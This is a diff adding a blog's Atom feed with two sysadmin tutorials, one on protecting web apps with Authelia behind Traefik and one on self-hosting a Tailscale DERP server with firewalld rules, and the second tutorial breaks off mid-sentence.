@@ -1,0 +1,775 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-23T21:45:54+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Tijjjy Blog</title><subtitle>Personal blog consisting of security and tech posts!</subtitle><author><name>Tijjjy</name></author><entry><title type="html">Securing Web Apps With Authelia</title><link href="http://localhost:4000/2023-01-23/Secure-Webapps-With-Authelia" rel="alternate" type="text/html" title="Securing Web Apps With Authelia" /><published>2023-01-23T00:00:00+08:00</published><updated>2023-01-23T00:00:00+08:00</updated><id>http://localhost:4000/2023-01-23/Secure-Webapps-With-Authelia</id><content type="html" xml:base="http://localhost:4000/2023-01-23/Secure-Webapps-With-Authelia"><![CDATA[<h1 id="introduction">Introduction</h1>
+<p>Welcome to another blog post, today I’m going to show you how to secure web applications with Authelia!</p>
+
+<p>Authelia intregrates into many common reverse proxies to add authentication in front of web applications, for example you have a website that you want to implement multi-factor authentication in front of it, Authelia has you covered. Authelia supports single factor and multi-factor, allowing you to authenticate with a one time passcode or even a yubikey!</p>
+
+<p>The reverse proxy I will be using to setup Authelia with will be Traefik as it is a easy to configure and fast reverse proxy.</p>
+
+<p>For this demonstration and walkthrough I will be using Ubuntu 22.04 on a 1vcpu 1GB Memory VPS hosted on <a href="https://www.binarylane.com.au/">www.binarylane.com.au</a>. I highly recommened BinaryLane as they provide fast and reliable VPS solutions and even dedicated servers!</p>
+
+<h1 id="prerequisites">Prerequisites</h1>
+<ul>
+  <li>Linux Server</li>
+  <li>Docker</li>
+  <li><a href="https://github.com/tijjjy/Authelia-Traefik-Docker">https://github.com/tijjjy/Authelia-Traefik-Docker</a>]</li>
+  <li>Ports 80,443 TCP Open</li>
+  <li>DNS Record for Authelia sub-domain</li>
+  <li>DNS Record for web application</li>
+</ul>
+
+<h1 id="setting-the-dns-record">Setting the DNS Record</h1>
+<p>Before we configure Authelia, we need to create a DNS record point to our server so that we can request a certificate from letsencrypt.</p>
+
+<p>Log into your Domain registrar and create an A record for the domain you want to use such as derp01.example.com thats points to the IP address of your server.</p>
+
+<p>For example:</p>
+<ul>
+  <li>auth.example.com</li>
+  <li>A Record</li>
+  <li>1.1.1.1 (Using your own servers IP address of course)</li>
+</ul>
+
+<p>Once set, confirm the domain resolves to the IP address by running,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig auth.example.com
+</code></pre></div></div>
+<p>OR</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup auth.example.com
+</code></pre></div></div>
+<p>Either command should return the IP address of your server.</p>
+
+<p>Repeat the previous steps for your web applications domain.</p>
+
+<h1 id="installing-requirements">Installing Requirements</h1>
+<p>To get started lets update the system which on Ubuntu can be done with the following commands.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
+<span class="nb">sudo </span>apt upgrade <span class="nt">-y</span>
+</code></pre></div></div>
+<p>After the upgrades are installed it’s always best to reboot the server to reload into the latest linux kernel.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>reboot
+</code></pre></div></div>
+<p>Once your server is fully updated and finished rebooting, lets go and install Docker and Git</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>docker docker-compose git <span class="nt">-y</span>
+</code></pre></div></div>
+<p>If you have trouble installing docker, you can find instructions for the linux distribution you are using at the official docker docs. <a href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install</a></p>
+
+<h1 id="cloning-the-repository">Cloning the Repository</h1>
+<p>With all the requirements installed, lets go ahead and clone my repository that contains all files and configuration we need to get started.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt
+git clone https://github.com/tijjjy/Authelia-Traefik-Docker authelia
+<span class="nb">cd </span>authelia
+<span class="nb">ls</span> <span class="nt">-lah</span>
+</code></pre></div></div>
+<p>If done correctly you should see the following</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture1.png" alt="ls directory" /></p>
+
+<h1 id="configuration">Configuration</h1>
+
+<h2 id="traefik-configuration">Traefik Configuration</h2>
+<p>There are a few sections within the config files that we need to change.</p>
+
+<p>First open docker-compose.yml</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano docker-compose.yml
+</code></pre></div></div>
+<p>Change the environment variable TZ in section for Authelia to your own timezone.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture2.png" alt="Authelia Timezone" /></p>
+
+<p>Now open the traefik config file</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano data/traefik/traefik.toml
+</code></pre></div></div>
+<p>At this point we only need to change 3 sections of the traefik config file.</p>
+
+<p>Go to the AUTHELIA ROUTER section in the http.routers section and change line</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule = "Host(`auth.example.com`)"
+</code></pre></div></div>
+<p>to the domain you want to use for Authelia, for this demo I will use,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule = "Host(`auth.tijjjy.me`)"
+</code></pre></div></div>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture3.png" alt="Authelia Host" /></p>
+
+<p>Next, go to the #MIDDLEWARES section to the address line and change</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address = "http://authelia:9091/api/verify?rd=https%3A%2F%2Fauth.example.com%2F"
+</code></pre></div></div>
+<p>to</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address = "http://authelia:9091/api/verify?rd=https://auth.tijjjy.me"
+</code></pre></div></div>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture4.png" alt="Authelia Middleware Address" /></p>
+
+<p>Lastly, change the email line at the #letsencrypt section to your email that you want to use to register the certificate with letsencrypt.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture5.png" alt="letsencrypt email" /></p>
+
+<p>Cool, thats it for the the traefik config file for now, let’s move on to the Authelia config file.</p>
+
+<h2 id="authelia-configuration">Authelia Configuration</h2>
+<p>A default reference template of the Authelia configuration can be found at the Authelia github which outlines every possible configuration available.<br />
+<a href="https://github.com/authelia/authelia/blob/master/config.template.yml">https://github.com/authelia/authelia/blob/master/config.template.yml</a></p>
+
+<p>Before we edit the Authelia config file we need to generate a few random secure strings, run this command 3 times to generate 3 strings.</p>
+
+<p>You can find more information on random alphanumeric strings at the Authelia docs.<br />
+<a href="https://www.authelia.com/reference/guides/generating-secure-values/#generating-a-random-alphanumeric-string">Generating-a-random-alphanumeric-string</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run authelia/authelia:latest authelia crypto rand <span class="nt">--length</span> 64 <span class="nt">--charset</span> alphanumeric
+</code></pre></div></div>
+<p>You should see output similar if successful. Take note of the output.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture6.png" alt="secure random strings" /></p>
+
+<p>Now open the Authelia config file,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano data/authelia/configuration.yml
+</code></pre></div></div>
+
+<p>Replace the variable jwt_secret with the first secure string you generated.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture7.png" alt="jwt_secret" /></p>
+
+<p>Replace the default_redirection_url variable with the domain you are using for Authelia.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture8.png" alt="default_redirection_url" /></p>
+
+<p>Next go down to the Session Provider Configuration section and change the secret variable to the second secure string you generated and replace the domain variable to the apex or root domain you are using, for me that is tijjjy.me.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture9.png" alt="session" /></p>
+
+<p>Next go to the Storage Provider Configuration section and change the encryption_key variable to the 3rd secure random string you generated.<br />
+<img src="/images/posts/securewebappswithauthelia/picture11.png" alt="encryption_key" /></p>
+
+<p>That’s it for the configuration for now. Well Done!</p>
+
+<h2 id="creating-an-authelia-user">Creating an Authelia User</h2>
+<p>More information on generating passwords for users can be found at the Authelia docs.<br />
+<a href="https://www.authelia.com/reference/guides/passwords/#passwords">https://www.authelia.com/reference/guides/passwords/#passwords</a></p>
+
+<p>It’s time to create our first user so we can login to our Authelia instance, we will be using the pbkdf2 hashing algorithm to generate our password, lets go ahead and run the command to create our password. Remember to change the ‘password’ argument to the password you want to use!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run authelia/authelia:latest authelia crypto <span class="nb">hash </span>generate pbkdf2 <span class="nt">--password</span> <span class="s1">'password'</span>
+</code></pre></div></div>
+
+<p>Now that we have our password hash we want to use, let’s open the users_database.yml file and create our user.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano data/authelia/users_database.yml
+</code></pre></div></div>
+<p>Replace “authelia-demo” with the username you want to use, I will use “tijjjy”.<br />
+Replace “displayname” with your desired display name.<br />
+Replace “password” with the password hash you just generated.<br />
+And finally, replace “email” with the email you want to use for the your user.</p>
+
+<p>Your users file should look something like this,</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture10.png" alt="default_redirection_url" /></p>
+
+<p>We now have our user all setup and ready to go!</p>
+<h1 id="first-time-start-up">First Time Start-Up</h1>
+<p>All of our initial configuration should be complete, lets go ahead and start out containers.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose up <span class="nt">-d</span>
+</code></pre></div></div>
+
+<p>Let’s go ahead now and open your preferred browser and navigate to https://auth.domain.com replacing auth.domain.com with the domain you set for Authelia.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture12.png" alt="Authelia Homepage" /></p>
+
+<p>You should see the Authelia homepage, go ahead and login with the user you created, you will be prompted to setup OTP multi-factor authentication.</p>
+
+<p>One you click on the register button for OTP, open the following file which will contain the initial link to register multi-factor authentication,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano data/authelia/notification.txt
+</code></pre></div></div>
+
+<p>Once you have setup multi-factor authentication, let’s go ahead and add our first web application to Traefik and Authelia!</p>
+
+<h1 id="adding-our-first-web-application">Adding Our First Web Application</h1>
+<p>Open the Traefik config file,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano data/traefik/traefik.toml
+</code></pre></div></div>
+
+<p>Navigate down to the services section and add the following,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[http.services.webapp]
+  [http.services.webapp.loadBalancer]
+    [[http.services.webapp.loadBalancer.servers]]
+      url = "http://whoami:2001/"
+</code></pre></div></div>
+<p>Replacing the each reference to webapp with the name you want for the service
+Replacing the “url” with the url or address of the web application you want to protect, since I’m protecting another container in the same network, I can just put the container name and it’s port.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture13.png" alt="webapp" /></p>
+
+<p>Now lets add the http router, go to the http.routes section and add the following,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[http.routers.webapp]
+  entryPoints = ["https"]
+  rule = "Host(`webapp.tijjjy.me`)"
+  middlewares = ["authelia"]
+  service = "webapp"
+  [http.routers.webapp.tls]
+    certResolver = "letsencrypt"
+</code></pre></div></div>
+<p>Once again replacing “webapp” with the name you want to call the router.</p>
+
+<p>Make sure for the service line, to add the name of the service that you gave your web application, in my case it was “webapp”.</p>
+
+<p>Replace the line,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  rule = "Host(`webapp.domain.com`)"
+</code></pre></div></div>
+<p>With the domain name you want for your web applications. Make sure the domain name is set correctly in your DNS registrar!!!</p>
+
+<p>It should look something like this,</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture14.png" alt="webapp http router" /></p>
+
+<p>Now lets open the Authelia configuration and add our web application.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano data/authelia/configuration.yml
+</code></pre></div></div>
+
+<p>Go to the rules section, and replace the default rule with your the domain of the web application you added to Traefik, it should look like this.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture15.png" alt="Authelia webapp" /></p>
+
+<h1 id="accessing-protected-web-application">Accessing Protected Web Application</h1>
+<p>Epic, we should be all set and ready to restart our containers and login to our newly protected web application. Let’s go ahead and restart our containers. Make sure to save your configurations!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose down
+docker-compose up <span class="nt">-d</span>
+</code></pre></div></div>
+
+<p>Open your preferred browser and navigate to the URL for your web application, for me it is https://webapp.tijjjy.me</p>
+
+<p>As you can see by the URL, we have been redirected back to Authelia and asked to login, let’s do that.</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture16.png" alt="Authelia webapp accessing" /></p>
+
+<p>Once logged in you will now be accessing your protected web application!!!</p>
+
+<p><img src="/images/posts/securewebappswithauthelia/picture17.png" alt="Authelia webapp accessing" /></p>
+
+<h1 id="end">End</h1>
+
+<p>Awesome work, you are now protecting your web application, you can go ahead and add more web applications to Authelia and Traefik to protect even more services. I definitely encourge you to check out the Authelia and Traefik documention on how to do even more advanced configurations.</p>
+
+<p>I hope you enjoyed this walkthrough and learned how easy it is to protected web applications with Authelia.</p>
+
+<p>Thanks for reading!</p>
+
+<h1 id="links">Links</h1>
+<ul>
+  <li>BinaryLane <a href="https://www.binarylane.com.au/">www.binarylane.com.au</a></li>
+  <li>Github <a href="https://github.com/tijjjy">https://github.com/tijjjy</a></li>
+  <li>Github Repository <a href="https://github.com/tijjjy/Authelia-Traefik-Docker">https://github.com/tijjjy/Authelia-Traefik-Docker</a></li>
+  <li>Authelia <a href="https://www.authelia.com/">https://www.authelia.com</a></li>
+  <li>Traefik <a href="https://doc.traefik.io/traefik/">https://doc.traefik.io/traefik</a></li>
+</ul>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[Introduction Welcome to another blog post, today I’m going to show you how to secure web applications with Authelia! Authelia intregrates into many common reverse proxies to add authentication in front of web applications, for example you have a website that you want to implement multi-factor authentication in front of it, Authelia has you covered. Authelia supports single factor and multi-factor, allowing you to authenticate with a one time passcode or even a yubikey! The reverse proxy I will be using to setup Authelia with will be Traefik as it is a easy to configure and fast reverse proxy. For this demonstration and walkthrough I will be using Ubuntu 22.04 on a 1vcpu 1GB Memory VPS hosted on www.binarylane.com.au. I highly recommened BinaryLane as they provide fast and reliable VPS solutions and even dedicated servers! Prerequisites Linux Server Docker https://github.com/tijjjy/Authelia-Traefik-Docker] Ports 80,443 TCP Open DNS Record for Authelia sub-domain DNS Record for web application Setting the DNS Record Before we configure Authelia, we need to create a DNS record point to our server so that we can request a certificate from letsencrypt. Log into your Domain registrar and create an A record for the domain you want to use such as derp01.example.com thats points to the IP address of your server. For example: auth.example.com A Record 1.1.1.1 (Using your own servers IP address of course) Once set, confirm the domain resolves to the IP address by running, dig auth.example.com OR nslookup auth.example.com Either command should return the IP address of your server. Repeat the previous steps for your web applications domain. Installing Requirements To get started lets update the system which on Ubuntu can be done with the following commands. sudo apt update sudo apt upgrade -y After the upgrades are installed it’s always best to reboot the server to reload into the latest linux kernel. sudo reboot Once your server is fully updated and finished rebooting, lets go and install Docker and Git sudo apt install docker docker-compose git -y If you have trouble installing docker, you can find instructions for the linux distribution you are using at the official docker docs. https://docs.docker.com/engine/install Cloning the Repository With all the requirements installed, lets go ahead and clone my repository that contains all files and configuration we need to get started. cd /opt git clone https://github.com/tijjjy/Authelia-Traefik-Docker authelia cd authelia ls -lah If done correctly you should see the following Configuration Traefik Configuration There are a few sections within the config files that we need to change. First open docker-compose.yml nano docker-compose.yml Change the environment variable TZ in section for Authelia to your own timezone. Now open the traefik config file nano data/traefik/traefik.toml At this point we only need to change 3 sections of the traefik config file. Go to the AUTHELIA ROUTER section in the http.routers section and change line rule = "Host(`auth.example.com`)" to the domain you want to use for Authelia, for this demo I will use, rule = "Host(`auth.tijjjy.me`)" Next, go to the #MIDDLEWARES section to the address line and change address = "http://authelia:9091/api/verify?rd=https%3A%2F%2Fauth.example.com%2F" to address = "http://authelia:9091/api/verify?rd=https://auth.tijjjy.me" Lastly, change the email line at the #letsencrypt section to your email that you want to use to register the certificate with letsencrypt. Cool, thats it for the the traefik config file for now, let’s move on to the Authelia config file. Authelia Configuration A default reference template of the Authelia configuration can be found at the Authelia github which outlines every possible configuration available. https://github.com/authelia/authelia/blob/master/config.template.yml Before we edit the Authelia config file we need to generate a few random secure strings, run this command 3 times to generate 3 strings. You can find more information on random alphanumeric strings at the Authelia docs. Generating-a-random-alphanumeric-string docker run authelia/authelia:latest authelia crypto rand --length 64 --charset alphanumeric You should see output similar if successful. Take note of the output. Now open the Authelia config file, nano data/authelia/configuration.yml Replace the variable jwt_secret with the first secure string you generated. Replace the default_redirection_url variable with the domain you are using for Authelia. Next go down to the Session Provider Configuration section and change the secret variable to the second secure string you generated and replace the domain variable to the apex or root domain you are using, for me that is tijjjy.me. Next go to the Storage Provider Configuration section and change the encryption_key variable to the 3rd secure random string you generated. That’s it for the configuration for now. Well Done! Creating an Authelia User More information on generating passwords for users can be found at the Authelia docs. https://www.authelia.com/reference/guides/passwords/#passwords It’s time to create our first user so we can login to our Authelia instance, we will be using the pbkdf2 hashing algorithm to generate our password, lets go ahead and run the command to create our password. Remember to change the ‘password’ argument to the password you want to use! docker run authelia/authelia:latest authelia crypto hash generate pbkdf2 --password 'password' Now that we have our password hash we want to use, let’s open the users_database.yml file and create our user. nano data/authelia/users_database.yml Replace “authelia-demo” with the username you want to use, I will use “tijjjy”. Replace “displayname” with your desired display name. Replace “password” with the password hash you just generated. And finally, replace “email” with the email you want to use for the your user. Your users file should look something like this, We now have our user all setup and ready to go! First Time Start-Up All of our initial configuration should be complete, lets go ahead and start out containers. docker-compose up -d Let’s go ahead now and open your preferred browser and navigate to https://auth.domain.com replacing auth.domain.com with the domain you set for Authelia. You should see the Authelia homepage, go ahead and login with the user you created, you will be prompted to setup OTP multi-factor authentication. One you click on the register button for OTP, open the following file which will contain the initial link to register multi-factor authentication, nano data/authelia/notification.txt Once you have setup multi-factor authentication, let’s go ahead and add our first web application to Traefik and Authelia! Adding Our First Web Application Open the Traefik config file, nano data/traefik/traefik.toml Navigate down to the services section and add the following, [http.services.webapp] [http.services.webapp.loadBalancer] [[http.services.webapp.loadBalancer.servers]] url = "http://whoami:2001/" Replacing the each reference to webapp with the name you want for the service Replacing the “url” with the url or address of the web application you want to protect, since I’m protecting another container in the same network, I can just put the container name and it’s port. Now lets add the http router, go to the http.routes section and add the following, [http.routers.webapp] entryPoints = ["https"] rule = "Host(`webapp.tijjjy.me`)" middlewares = ["authelia"] service = "webapp" [http.routers.webapp.tls] certResolver = "letsencrypt" Once again replacing “webapp” with the name you want to call the router. Make sure for the service line, to add the name of the service that you gave your web application, in my case it was “webapp”. Replace the line, rule = "Host(`webapp.domain.com`)" With the domain name you want for your web applications. Make sure the domain name is set correctly in your DNS registrar!!! It should look something like this, Now lets open the Authelia configuration and add our web application. nano data/authelia/configuration.yml Go to the rules section, and replace the default rule with your the domain of the web application you added to Traefik, it should look like this. Accessing Protected Web Application Epic, we should be all set and ready to restart our containers and login to our newly protected web application. Let’s go ahead and restart our containers. Make sure to save your configurations! docker-compose down docker-compose up -d Open your preferred browser and navigate to the URL for your web application, for me it is https://webapp.tijjjy.me As you can see by the URL, we have been redirected back to Authelia and asked to login, let’s do that. Once logged in you will now be accessing your protected web application!!! End Awesome work, you are now protecting your web application, you can go ahead and add more web applications to Authelia and Traefik to protect even more services. I definitely encourge you to check out the Authelia and Traefik documention on how to do even more advanced configurations. I hope you enjoyed this walkthrough and learned how easy it is to protected web applications with Authelia. Thanks for reading! Links BinaryLane www.binarylane.com.au Github https://github.com/tijjjy Github Repository https://github.com/tijjjy/Authelia-Traefik-Docker Authelia https://www.authelia.com Traefik https://doc.traefik.io/traefik]]></summary></entry><entry><title type="html">Self Host Tailscale Derp Server</title><link href="http://localhost:4000/2023-01-22/Self-Host-Tailscale-Derp-Server" rel="alternate" type="text/html" title="Self Host Tailscale Derp Server" /><published>2023-01-22T00:00:00+08:00</published><updated>2023-01-22T00:00:00+08:00</updated><id>http://localhost:4000/2023-01-22/Self-Host-Tailscale-Derp-Server</id><content type="html" xml:base="http://localhost:4000/2023-01-22/Self-Host-Tailscale-Derp-Server"><![CDATA[<h1 id="introduction">Introduction</h1>
+<p>Welcome to my post, today I’m going to show you how to deploy your own Tailscale DERP server using a docker container I built myself!</p>
+
+<p>For this demonstration and walkthrough I will be using Ubuntu 22.04 on a 1vcpu 1GB Memory VPS hosted on <a href="https://www.binarylane.com.au/">www.binarylane.com.au</a>. I highly recommened BinaryLane as they provide fast and reliable VPS solutions and even dedicated servers!</p>
+
+<h1 id="prerequisites">Prerequisites</h1>
+<ul>
+  <li>Linux Server</li>
+  <li>Docker (<a href="https://docs.docker.com/engine/install/">Docker Installation Docs</a>)</li>
+  <li>Git</li>
+  <li><a href="https://github.com/tijjjy/Tailscale-DERP-Docker">https://github.com/tijjjy/Tailscale-DERP-Docker</a></li>
+  <li>Ports 80,443 TCP Open</li>
+  <li>Port 3478 UDP Open</li>
+  <li>DNS Record for DERP domain name</li>
+  <li>Firewalld</li>
+  <li>Tailscale Account (<a href="https://login.tailscale.com/start">Create a Tailscale account</a>)</li>
+</ul>
+
+<h1 id="why-self-host-your-own-derp-server">Why self host your own DERP server?</h1>
+<p>There are a variety of reasons why you might want to run your own Tailscale DERP server, including but not limited to:</p>
+<ul>
+  <li>Organisations using Tailscale may have requirements regarding where network traffic goes.</li>
+  <li>Learning new skills and how DERP works.</li>
+  <li>Privacy reasons, you may want to have full control of the infrastructure.</li>
+</ul>
+
+<h1 id="installing-requirements">Installing Requirements</h1>
+<p>To get started lets update the system which on Ubuntu can be done with the following commands.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
+<span class="nb">sudo </span>apt upgrade <span class="nt">-y</span>
+</code></pre></div></div>
+<p>After the upgrades are installed it’s always best to reboot the server to reload into the latest linux kernal.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>reboot
+</code></pre></div></div>
+<p>Once your server is fully updated and finished rebooting, lets go and install Docker and Git</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>docker docker-compose git <span class="nt">-y</span>
+</code></pre></div></div>
+<p>If you have trouble installing docker, you can find instructions for the linux distribution you are using at the official docker docs. <a href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install</a></p>
+
+<p>Now to install the firewall, personally I use firewalld but this can be done with any firewall.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install firewalld -y
+sudo systemctl enable --now firewalld
+</code></pre></div></div>
+
+<p>Additionally, we need to restart the docker daemon. When installing firewalld after docker the networking for docker needs to be restarted or all containers won’t have network connectivity due to installing a new firewall.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl restart docker
+</code></pre></div></div>
+
+<p>We can double check that firewalld is running by using the following command,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl status firewalld
+</code></pre></div></div>
+<p>You should see the following output.</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture1.png" alt="Firewalld status" /></p>
+
+<h1 id="setting-up-the-firewall">Setting Up the Firewall</h1>
+<p>We can check the default firewall rules by running,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>firewall-cmd <span class="nt">--list-all</span>
+</code></pre></div></div>
+<p>Which should output the default rules on the public zone.</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture2.png" alt="Default firewall rules" /></p>
+
+<p>Lets go ahead and open the required ports for our Tailscale DERP server.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>public <span class="nt">--permanent</span> <span class="nt">--add-port</span><span class="o">=</span>80/tcp
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>public <span class="nt">--permanent</span> <span class="nt">--add-port</span><span class="o">=</span>443/tcp
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>public <span class="nt">--permanent</span> <span class="nt">--add-port</span><span class="o">=</span>3478/udp
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--reload</span>
+</code></pre></div></div>
+
+<p>Checking the public zone again we can now see our rules have been added and are now open!</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture3.png" alt="New firewall rules" /></p>
+
+<h3 id="this-section-can-be-skipped-but-it-is-advised-for-extra-security">This section can be skipped but it is advised for extra security</h3>
+<p>For added security lets create a new firewalld zone for ssh and add our home IP to it, doing so will only allow our IP to connect via ssh and block all other IPs.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>firewall-cmd <span class="nt">--permanent</span> <span class="nt">--new-zone</span><span class="o">=</span>ssh
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>ssh <span class="nt">--permanent</span> <span class="nt">--set-target</span><span class="o">=</span>DROP
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>public <span class="nt">--permanent</span> <span class="nt">--remove-service</span><span class="o">=</span>ssh
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>ssh <span class="nt">--permanent</span> <span class="nt">--add-service</span><span class="o">=</span>ssh
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--zone</span><span class="o">=</span>ssh <span class="nt">--permanent</span> <span class="nt">--add-source</span><span class="o">=</span>youripaddress
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--reload</span>
+</code></pre></div></div>
+<p>Now your server is secured for ssh by only allowing your IP address to connect, as a backup it is good to make sure you can connect via KVM in your hosting provider incase your IP changes or you get locked out.</p>
+
+<h1 id="setting-the-dns-record">Setting the DNS Record</h1>
+<p>Before we configure and start our DERP server, we need to create a DNS record point to our server so that we can request a certificate from letsencrypt, the domain is also used in the Tailscale ACL for clients as well.</p>
+
+<p>Log into your Domain registrar and create an A record for the domain you want to use such as derp01.example.com thats points to the IP address of your server.</p>
+
+<p>For example,</p>
+<ul>
+  <li>derp01.example.com</li>
+  <li>A Record</li>
+  <li>1.1.1.1 (Using your own servers IP address of course)</li>
+</ul>
+
+<p>Once set, confirm the domain resolves to the IP address by running,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig derp01.example.com
+</code></pre></div></div>
+<p>OR</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup derp01.example.com
+</code></pre></div></div>
+<p>Either command should return the IP address of your server.</p>
+
+<h1 id="generating-a-tailscale-auth-token">Generating a Tailscale Auth Token</h1>
+<p>To authenticate our DERP container to our tailnet we need to supply an initial authentication token to connect the container to our tailnet, this can be done by going to <a href="https://login.tailscale.com/admin/settings/keys">https://login.tailscale.com/admin/settings/keys</a>.</p>
+
+<p>Once you are logged into your Tailscale account you will see the “Auth Keys” section with the “Generate auth key…” button as seen below.</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture4.png" alt="Tailscale Auth Key Panel" /></p>
+
+<p>Go ahead and click on the “Generate auth key…”, it will open up a prompt for additional key options, just leave all defaults and click on the blue button at the bottom “Generate Key”.</p>
+
+<p>Copy and note the outputted key somewhere safe, we will use it in in the next few steps.</p>
+
+<h1 id="cloning-repo-and-setting-up-the-derp-config">Cloning Repo and Setting up the DERP config</h1>
+<p>Great, now we have an updated server with all the requirements installed. Lets go ahead and clone the repository containing the files for the DERP container.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt
+git clone https://github.com/tijjjy/Tailscale-DERP-Docker
+<span class="nb">cd </span>Tailscale-DERP-Docker
+<span class="nb">ls</span> <span class="nt">-lah</span>
+</code></pre></div></div>
+<p>We now have all the required files to configure, build and run our DERP server container.</p>
+
+<p>All we need to edit is the .env file, as this is where we will set our domain we want to use and our Tailscale Auth Key.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano .env
+</code></pre></div></div>
+<p>OR</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim .env
+</code></pre></div></div>
+
+<p>Now we need to replace two variables,</p>
+<ul>
+  <li>TAILSCALE_DERP_HOSTNAME</li>
+  <li>TAILSCALE_AUTH_KEY</li>
+</ul>
+
+<p>For the TAILSCALE_DERP_HOSTNAME variable, replace the default value with the domain you set in your DNS records.</p>
+
+<p>For the TAILSCALE_AUTH_KEY variable, replace the default value with the Tailscale Auth Token you created and noted down before.</p>
+
+<p>If done correctly your .env file will look similar to the following screenshot.</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture5.png" alt="Tailscale Auth Key Panel" /></p>
+
+<h1 id="building-the-derp-container">Building the DERP container</h1>
+<p>Awesome, we are almost there, now all we need to do it build the docker container, this can be done like so,</p>
